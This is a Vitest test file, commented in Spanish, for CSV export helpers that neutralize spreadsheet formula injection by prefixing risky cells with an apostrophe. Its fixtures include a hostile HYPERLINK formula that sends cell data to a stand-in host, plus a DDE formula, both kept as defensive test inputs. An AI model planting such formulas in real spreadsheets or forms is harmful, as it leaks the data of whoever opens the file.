import { describe, it, expect } from 'vitest';
import { neutralizeFormula, csvCell, toCsv } from '@/lib/records/csv';

describe('neutralizeFormula', () => {
  it('desactiva las celdas que Excel leería como fórmula', () => {
    // El caso real: un lead entrado por el formulario público.
    expect(neutralizeFormula('=HYPERLINK("http://malo/?"&A1,"ver")')).toBe(
      '\'=HYPERLINK("http://malo/?"&A1,"ver")',
    );
    for (const start of ['=', '+', '-', '@', '\t', '\r']) {
      expect(neutralizeFormula(`${start}cmd`)).toBe(`'${start}cmd`);
    }
  });

  it('no toca el texto normal', () => {
    expect(neutralizeFormula('Ana Ruiz')).toBe('Ana Ruiz');
    expect(neutralizeFormula('1.234,50')).toBe('1.234,50');
    expect(neutralizeFormula('a=b')).toBe('a=b'); // solo cuenta el primer carácter
    expect(neutralizeFormula('')).toBe('');
    expect(neutralizeFormula(null)).toBe('');
  });
});

describe('csvCell', () => {
  it('entrecomilla y duplica las comillas internas', () => {
    expect(csvCell('dice "hola"')).toBe('"dice ""hola"""');
    expect(csvCell('con, coma')).toBe('"con, coma"');
  });

  it('neutraliza antes de entrecomillar', () => {
    // Sin esto, las comillas del CSV no protegen: la hoja las quita primero.
    expect(csvCell('=1+1')).toBe('"\'=1+1"');
  });
});

describe('toCsv', () => {
  it('arma cabecera y filas', () => {
    expect(
      toCsv(
        ['Nombre', 'Importe'],
        [
          ['Ana', 100],
          ['=DDE()', 0],
        ],
      ),
    ).toBe('"Nombre","Importe"\n"Ana","100"\n"\'=DDE()","0"');
  });
});
